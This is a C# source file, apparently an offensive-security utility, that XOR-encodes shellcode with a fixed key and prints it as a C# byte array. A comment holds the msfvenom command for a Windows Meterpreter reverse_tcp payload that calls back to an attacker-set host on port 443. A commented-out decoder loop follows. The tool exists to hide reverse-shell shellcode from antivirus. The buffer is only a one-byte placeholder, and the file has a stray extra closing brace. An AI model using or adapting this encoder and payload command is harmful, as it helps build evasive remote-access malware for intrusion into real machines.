using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[1] {
		    0xd5 };

            // Encode with XOR (ofc dont use keys such as 0x00)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex;

            // Printout C# payload
            hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];

                if ((count + 1) == totalCount) // except last entry we do not need another comma
                {
                hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                hex.AppendFormat("0x{0:x2}, ", b);
                }

                if ((count + 1) % 15 == 0)
                {
                hex.Append("\n");
                }
            }

		Console.WriteLine($"XORed C# payload (key: 0xfa):");
		Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
	    }




            // decoder
            /*
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            */

        }
    }
}
